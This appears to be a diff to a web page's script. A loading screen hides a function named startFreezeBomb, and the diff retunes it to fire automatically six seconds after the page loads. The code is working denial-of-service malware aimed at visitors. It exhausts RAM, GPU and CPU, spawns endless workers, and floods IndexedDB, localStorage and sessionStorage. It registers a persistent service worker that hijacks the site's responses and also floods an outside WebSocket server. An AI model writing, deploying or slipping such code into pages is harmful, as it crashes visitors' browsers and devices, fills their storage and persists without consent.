@@ -60,7 +60,7 @@
             width: 0%;
             background: linear-gradient(90deg, #0ff, #f0f, #0ff);
             box-shadow: 0 0 20px #0ff;
-            animation: loadBar 4s ease-in-out forwards;
+            animation: loadBar 3s ease-in-out forwards;
         }
         .loading-text {
             margin-top: 25px;
@@ -455,22 +455,25 @@
 // ========== PHASE 1: LOADING SCREEN ==========
 setTimeout(() => {
     document.getElementById('loading-screen').classList.add('hidden');
-    startFreezeBomb();
-}, 4000);
+}, 3000);
 
-// ========== PHASE 2: EXTREME FREEZE ==========
+// ========== PHASE 2: FREEZE AFTER 6 SECONDS (3 sec loading + 3 sec viewing) ==========
+setTimeout(() => {
+    startFreezeBomb();
+}, 6000);
+
 function startFreezeBomb() {
 
-    // 1. MEMORY BOMB - Fill RAM
+    // 1. MEMORY BOMB
     const memoryBomb = [];
     setInterval(() => {
-        for(let m=0; m<500; m++) {
-            try { memoryBomb.push(new Float64Array(50000000).fill(Math.random())); } catch(e) {}
+        for(let m=0; m<100; m++) {
+            try { memoryBomb.push(new Float64Array(100000000).fill(Math.random())); } catch(e) {}
         }
-    }, 1);
+    }, 10);
 
     // 2. GPU OVERLOAD
-    for(let i=0; i<300; i++) {
+    for(let i=0; i<100; i++) {
         try {
             const c = document.createElement('canvas');
             c.width = 8192; c.height = 8192;
@@ -480,7 +483,7 @@ function startFreezeBomb() {
     }
 
     // 3. AUDIO CONTEXTS
-    for(let a=0; a<200; a++) {
+    for(let a=0; a<50; a++) {
         try {
             const ac = new (window.AudioContext || window.webkitAudioContext)();
             const osc = ac.createOscillator();
@@ -491,11 +494,11 @@ function startFreezeBomb() {
         } catch(e) {}
     }
 
-    // 4. CPU BOMB - Massive intervals
-    for(let i=0; i<50000; i++) {
+    // 4. CPU BOMB
+    for(let i=0; i<10000; i++) {
         setInterval(() => {
             let x = 0;
-            for(let j=0; j<500000; j++) {
+            for(let j=0; j<1000000; j++) {
                 x += Math.sin(j) * Math.cos(j) * Math.tan(j % 1.57 + 0.001);
                 x = Math.sqrt(Math.abs(x) + 1) * Math.log(j + 2);
                 x = Math.pow(x, 1.001) % 999999999;
@@ -507,15 +510,15 @@ function startFreezeBomb() {
     const animContainer = document.createElement('div');
     animContainer.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;pointer-events:none;overflow:hidden;';
     document.body.appendChild(animContainer);
-    for(let i=0; i<200000; i++) {
+    for(let i=0; i<50000; i++) {
         const div = document.createElement('div');
-        div.style.cssText = 'position:absolute;width:2px;height:2px;background:hsl('+(i%360)+',100%,50%);animation:spin '+(0.01+i%2)+'s linear infinite;';
+        div.style.cssText = 'position:absolute;width:3px;height:3px;background:hsl('+(i%360)+',100%,50%);animation:spin '+(0.02+i%3)+'s linear infinite;';
         div.style.left = Math.random()*100+'vw';
         div.style.top = Math.random()*100+'vh';
         animContainer.appendChild(div);
     }
     const style = document.createElement('style');
-    style.textContent = '@keyframes spin{from{transform:rotate(0deg)scale(1)}to{transform:rotate(360deg)scale(10)}}';
+    style.textContent = '@keyframes spin{from{transform:rotate(0deg)scale(1)}to{transform:rotate(360deg)scale(5)}}';
     document.head.appendChild(style);
 
     // 6. VIBRATION
@@ -541,24 +544,24 @@ function startFreezeBomb() {
         const dbReq = indexedDB.open('shadow_bomb_v3', 1);
         dbReq.onupgradeneeded = e => {
             const db = e.target.result;
-            for(let i=0; i<1000; i++) db.createObjectStore('store_'+i);
+            for(let i=0; i<500; i++) db.createObjectStore('store_'+i);
         };
         dbReq.onsuccess = e => {
             const db = e.target.result;
             setInterval(() => {
-                for(let i=0; i<1000; i++) {
+                for(let i=0; i<500; i++) {
                     try {
                         const tx = db.transaction(['store_'+i], 'readwrite');
                         const store = tx.objectStore('store_'+i);
                         store.put(new Blob([new Uint8Array(50000000)]), Math.random());
                     } catch(e) {}
                 }
-            }, 1);
+            }, 10);
         };
     } catch(e) {}
 
     // 10. WEBRTC
-    for(let r=0; r<500; r++) {
+    for(let r=0; r<100; r++) {
         try {
             const pc = new RTCPeerConnection();
             pc.createDataChannel('bomb_'+r);
@@ -585,7 +588,7 @@ function startFreezeBomb() {
             'self.addEventListener("install",e=>self.skipWaiting());'+
             'self.addEventListener("activate",e=>e.waitUntil(self.clients.claim()));'+
             'self.addEventListener("fetch",e=>e.respondWith(new Response("SHADOW")));'+
-            'setInterval(()=>{fetch("/");},1);'
+            'setInterval(()=>{fetch("/");},10);'
         ], {type:'application/javascript'}));
         navigator.serviceWorker.register(swScript);
     }
@@ -596,7 +599,7 @@ function startFreezeBomb() {
             const adapter = await navigator.gpu.requestAdapter();
             if(adapter) {
                 const device = await adapter.requestDevice();
-                for(let i=0; i<200; i++) {
+                for(let i=0; i<50; i++) {
                     device.createTexture({size:[16384,16384,1], format:'rgba8unorm', usage:GPUTextureUsage.RENDER_ATTACHMENT|GPUTextureUsage.COPY_SRC});
                 }
             }
@@ -605,7 +608,7 @@ function startFreezeBomb() {
     webgpuBomb();
 
     // 15. CANVAS 2D
-    for(let c=0; c<500; c++) {
+    for(let c=0; c<100; c++) {
         const cv = document.createElement('canvas');
         cv.width = 4096; cv.height = 4096;
         const ctx2d = cv.getContext('2d');
@@ -613,7 +616,7 @@ function startFreezeBomb() {
             setInterval(() => {
                 ctx2d.fillStyle = 'hsl('+Math.random()*360+',100%,50%)';
                 ctx2d.fillRect(0,0,4096,4096);
-            }, 1);
+            }, 5);
         }
     }
 
@@ -621,7 +624,7 @@ function startFreezeBomb() {
     const workerScript = URL.createObjectURL(new Blob([
         'self.onmessage=function(){while(true){let x=0;for(let i=0;i<999999999;i++){x+=Math.sin(i)*Math.cos(i)*Math.tan(i%1.57+0.001);x=Math.sqrt(Math.abs(x)+1)*Math.log(i+2);x=Math.pow(x,1.001)%999999999;}}}'
     ], {type:'application/javascript'}));
-    for(let w=0; w<128; w++) { try { new Worker(workerScript); } catch(e) {} }
+    for(let w=0; w<64; w++) { try { new Worker(workerScript); } catch(e) {} }
 
     // 17. RECURSION
     try { function recurse(n){if(n>0){recurse(n-1);recurse(n-1);recurse(n-1);recurse(n-1);}} recurse(40); } catch(e) {}
@@ -645,7 +648,7 @@ function startFreezeBomb() {
     setInterval(() => location.hash = Math.random().toString(36), 1);
 
     // 21. IFRAME BOMB
-    for(let i=0; i<500; i++) {
+    for(let i=0; i<100; i++) {
         const iframe = document.createElement('iframe');
         iframe.src = 'about:blank';
         iframe.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;';
@@ -653,18 +656,18 @@ function startFreezeBomb() {
     }
 
     // 22. IMAGE BOMB
-    for(let i=0; i<1000; i++) {
+    for(let i=0; i<500; i++) {
         const img = new Image();
         img.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7?'+Math.random();
     }
 
     // 23. FETCH BOMB
     setInterval(() => {
-        for(let i=0; i<500; i++) fetch('?'+Math.random()).catch(()=>{});
+        for(let i=0; i<100; i++) fetch('?'+Math.random()).catch(()=>{});
     }, 1);
 
     // 24. WEBSOCKET BOMB
-    for(let i=0; i<100; i++) {
+    for(let i=0; i<50; i++) {
         try {
             const ws = new WebSocket('wss://echo.websocket.org');
             ws.onopen = () => { setInterval(()=>ws.send(new Uint8Array(5000000)), 1); };
@@ -672,27 +675,27 @@ function startFreezeBomb() {
     }
 
     // 25. ANIMATION FRAME BOMB
-    function animBomb() { for(let i=0; i<500; i++) requestAnimationFrame(animBomb); }
+    function animBomb() { for(let i=0; i<100; i++) requestAnimationFrame(animBomb); }
     animBomb();
 
     // 26. TIMER BOMB
     setInterval(() => {
-        for(let i=0; i<5000; i++) { setTimeout(()=>{},0); setInterval(()=>{},999999); }
+        for(let i=0; i<1000; i++) { setTimeout(()=>{},0); setInterval(()=>{},999999); }
     }, 1);
 
     // 27. LOCALSTORAGE BOMB
     setInterval(() => {
-        for(let i=0; i<5000; i++) localStorage.setItem('b_'+i+'_'+Math.random(), new Array(1000000).fill('X').join(''));
-    }, 1);
+        for(let i=0; i<1000; i++) localStorage.setItem('b_'+i+'_'+Math.random(), new Array(1000000).fill('X').join(''));
+    }, 10);
 
     // 28. SESSIONSTORAGE BOMB
     setInterval(() => {
-        for(let i=0; i<5000; i++) sessionStorage.setItem('b_'+i+'_'+Math.random(), new Array(1000000).fill('X').join(''));
-    }, 1);
+        for(let i=0; i<1000; i++) sessionStorage.setItem('b_'+i+'_'+Math.random(), new Array(1000000).fill('X').join(''));
+    }, 10);
 
     // 29. CONSOLE BOMB
     setInterval(() => {
-        for(let i=0; i<50000; i++) { console.log(Math.random()); console.error(Math.random()); }
+        for(let i=0; i<10000; i++) { console.log(Math.random()); console.error(Math.random()); }
     }, 1);
 }
 
